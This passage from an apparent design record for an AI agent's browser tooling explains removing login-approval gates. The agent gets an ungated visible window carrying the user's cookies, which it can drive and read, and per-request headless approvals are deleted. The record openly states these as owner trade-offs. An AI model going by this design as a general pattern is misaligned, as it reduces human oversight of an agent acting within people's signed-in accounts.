  ├─ visible (headed) window, starting with whatever cookies the vault holds
  │     page shows content      → the agent works
  │     page shows a login form → the agent says so in the chat; the person
  │                               signs in by hand and replies in the chat;
  │                               the agent continues
  │     no gate, no question, no approval
  └─ headless / background fetch
        vault cookies, route gate and per-site CDN manifest apply
        no stored session → refused in words
```

The branch is taken on **what the page showed**, never on whether the vault holds cookies.
That second signal is the one that misled every step of §1: a jar of guest cookies over a dead
session answers "yes, there are cookies" and means nothing.

### 3. The price of the ungated visible window, and whose decision it is

**This is the owner's product decision with its cost stated. It is not a security property
this project derived, and it must not be read as one.** The distinction is load-bearing
because this record has already once put "a human is watching" where a gate belongs;
*Amendment* §1 said the opposite in its own words — "a human watching a browser window is
evidence that something is happening, not consent that it should" — and that sentence was
right about consent. What has changed is the owner's judgement about which failure is worse,
not a discovery that watching is a control.

What the split login window bought was not its cleanliness but its **poverty**: it lived in
its own registry, no `browser_*` tool could reach it, and it held no stored login. Merging the
windows gives the visible window four properties at once:

- **ungated** — `_domain_route_gate` continues every request when `self._headed`, and
  `_check_domain`, the pre-navigation layer, returns early for the same case;
- **driveable by the agent** — it is an ordinary entry in `_active_browser_sessions`, so
  `browser_click`, `browser_fill` and `browser_navigate` all operate on it;
- **readable by the agent** — `get_page_html` and `a11y_snapshot` return whatever is on
  screen, the person's own signed-in pages included;
- **carrying the person's cookies** — `_inject_vault_cookies` loads the vault jar for the
  session's scope when it opens.

What limits it is narrower than a gate, and is written here as exactly that: the firewall over
which agents may use the browser tools at all, a person watching a window they can close, and
the audit. None of the three refuses a request.

Two things do still hold and are mechanisms rather than circumstances, which is why they are
listed apart from the paragraph above:

- **the write side stays scoped.** `_scope_cookies_by_etld1` files only cookies matching the
  session's own `_etld1s`, so a window that walks to an identity provider stores nothing for
  it (`test_an_ungated_window_still_stores_only_its_own_site`);
- **scope cannot widen through session reuse.** `_session_scope_matches` compares the
  requested scope with the live one by equality in both directions, and `_get_or_create_session`
  closes and replaces a mis-scoped session rather than serving it. *Read in the code here; not
  measured.*

Also recorded because a cost is not only technical: the visible window no longer starts clean,
so a person who is already signed in is not asked to sign in again. That is the other half of
what merging bought.

### 4. What the code does now

**Gone.** `web_auth.identity_marks`, `_identity_changed`, `record_approval`, `get_approval`,
`is_approved`, `APPROVAL_VIA_LOGIN_WINDOW` and the vault's `approved` / `approved_identity`
fields; the agent tool `open_login_window` with its `_login_windows` registry,
`capture_login_cookies`, `commit_login_cookies` and the `approved_via` argument;
`_ask_human_to_approve`, `get_pending_auth_approvals` and `get_login_windows` in `browser.py`;
`web_auth_approve_headless` and `web_auth_reject_headless` in `service.py` and on the
`local_api.ALLOWED_COMMANDS` allowlist; `WebAuthApprovalDialog.svelte` and
`services/webAuthApproval.ts` in the UI. A stored jar is exactly
`{cookies, authenticated_at, last_used_at}`, asserted as an absence by
`test_no_approval_survives_anywhere_in_the_vault` — including that no unread field survives on
disk, because a field written today and read again tomorrow is a half-restored mechanism.

**Renamed, because the old name overclaimed.** `web_auth.revoke` is now
`web_auth.forget_cookies`, and the UI command `web_auth_revoke_domain` is now
`web_auth_forget_cookies`; the panel heading reads "Stored Web Cookies" and the button reads
"Forget". Deleting our copy of a jar never signed anybody out of anything, and the answer now
says so — "still signed in … sign out there if that is what you meant" — with a test that
refuses any wording readable as a logout. The capability is worth keeping under an honest
name: it is the only way to take a login away from an agent without touching the account.

**New.**

- A headed session installs no gate. `_domain_route_gate` continues the request and records it
  as `visible_window_passthrough` — deliberately not named a passthrough *through* a gate,
  since nothing was enforced. `_check_domain` returns early for the same case; two layers
  disagreeing is how a hole hides.
- A headless `use_auth` browse with no live session is refused in words before anything opens:
  `web_auth.has_session` (a pure read — it does not stamp `last_used_at`, and an all-expired
  jar answers no), audit status `auth_denied:no_session`, and a message that names
  `keep_open=true` as the way a person can act. `keep_open=True` is exempt because that **is**
  the visible window.
- When a visible page shows a login form — `_page_wants_a_login`, decided on the page's own
  markup — the tool appends `_login_needed_notice`: the words the agent is to say in the chat,
  and an instruction to stop and wait for the person's reply. There is no push channel from a
  tool into a conversation, so the string has to name who acts next. Audited as
  `login_page_shown`.

**Kept, and verified here.** `browser_state.json` neither read nor written — `_open` passes no
`storage_state` for any session and a file left on disk is inert
(`test_no_session_loads_a_saved_browser_state`); the vendored Public Suffix List behind
`resolve_etld1`, still returning `None` rather than its input; the route gate's destination
check and the per-site CDN manifest, now on the headless path only (§3 of the first amendment,
narrowed in place); the audit carrying `initiator`, `dest_host`, `method` and `resource_type`,
with one first-seen row per decision, one summary row per repeat, and size rotation
(`WEB_AUDIT_MAX_BYTES`, `WEB_AUDIT_KEEP`).

### 5. The Task 008 per-request headless prompt went with it

*Amendment* §1 lists three checks and calls the third — "headless additionally asks a person,
per request", the ADR-029 Task 008 gate, audit statuses `headless_approved` /
`headless_rejected` / `headless_no_ui` — unchanged. It is not unchanged. Those three statuses
appear nowhere in the tree, and the two commands that carried the answer are deleted from
`service.py` and from the allowlist. The headless path now asks nobody anything: it is gated
by `has_session` and by the route gate, and both are refusals in code rather than questions to
a person.

This is a real reduction in what a person is consulted about, and it is stated in its own
section rather than folded into §4 so that a reader comparing the amendments cannot carry
§1's check 3 forward as current.

### 6. Not settled here

- **No live run, and no test run.** This amendment is a reading of code and of the suite that
  landed beside it. Nothing here was exercised against a real site, and the suite was not
  executed in this pass.
- **The suite caveat still applies.** *Amendment* §5's third bullet — four deliberate
  breakages out of fourteen left the earlier suite green, board
  `THE-NEW-WEB-AUTH-TESTS-SURVIVE-THE-DELETION-OF-WHAT-THEY-ARE-NAMED-FOR` — is about tests
  that have since been deleted. Nothing has re-established that their replacements go red when
  they should.
- `LIST-AUTH-DOMAINS-REPORTS-ON-A-STORE-THAT-NO-LONGER-RECEIVES-LOGINS` is untouched.
- Whether an ungated visible window is the right trade is the owner's call and is recorded as
  one (§3). It is not a question this record answers, and no measurement in it bears on it.

---

## Review

- **CC (S137):** Verify-pass against code: all 6 review points hold; 2 additional findings (firewall schema gap, Camoufox-as-primary routing) incorporated. 9 clarifying questions on T1-T8 task decomposition resolved.
- **Ark (S137):** Proposal author. Expanded proposal per review findings; answered all clarifying questions; agreed on design details (DPAPI via Python `keyring`, parallel AuthBrowser path, drop `fetch_json+use_auth` from MVP, separate `is_auth_domain_allowed()` firewall function, audit hook inside `web_auth.py`, separate `tools/web_auth_tools.py` module, inline ChatPanel login button).
- **Mike (S137):** Approved scope (variant B / READ-only / Tauri WebView popup). MVP domain list: `example.com` (marketplace orders) + `example.org` (grocery orders); extensible via config without code changes. Design details accepted after team Discussion.

### Resolved Discussion Items

> **Read with the amendment above, 2026-09-11.** Three rows resolve to things that no longer
> exist: **#11** (`is_auth_domain_allowed`) was deleted with the whitelist, **#14** (inline
> ChatPanel login button) went with the UI in `c2cfab07`, and **#1**'s "config-driven,
> extensible" domain list is exactly the config that was removed. #3 (`list_auth_domains`),
> #4, #5, #12 and #13 still describe live code.

| # | Question | Resolution |
|---|----------|------------|
| 1 | MVP domains | `example.com`, `example.org` — config-driven, extensible |
| 2 | Camoufox cookie planting mechanism | Spike (T1) gate before T4 implementation |
| 3 | Agent domain discovery | New tool `list_auth_domains()` returns `[{domain, has_cookies, expires}]` |
| 4 | WRITE prevention enforcement | Restricted `AuthBrowser` wrapper exposes only `goto(url)` + `get_page_content()` |
| 5 | Audit file write protection | DPC core process (`web_auth.py`) writes; agent has no write access |
| 6 | T1 spike done-criteria | Camoufox + planted cookies for `login.example.com` → `example.com/my/orders` renders as logged-in |
| 7 | T2 IPC mechanism | Existing WebSocket `local_api.py`, new command `web_auth_login_complete` |
| 8 | DPAPI library | Python `keyring` package (cross-platform abstraction; DPAPI on Windows) |
| 9 | AuthBrowser integration | Parallel to existing `_browse_with_camoufox`, triggered only when `use_auth` param present |
| 10 | `fetch_json+use_auth` in MVP | Out of scope — only `browse_page` supports `use_auth` |
| 11 | Firewall validation surface | New `is_auth_domain_allowed(agent_id, domain)`, separate from `is_tool_allowed()` |
| 12 | Audit hook location | Inside `web_auth.py` after successful auth-request |
| 13 | `list_auth_domains` module placement | `tools/web_auth_tools.py` (separate from `browser.py`) |
| 14 | UI panel placement | Inline in `ChatPanel.svelte` (agent-initiated flow, not settings) |
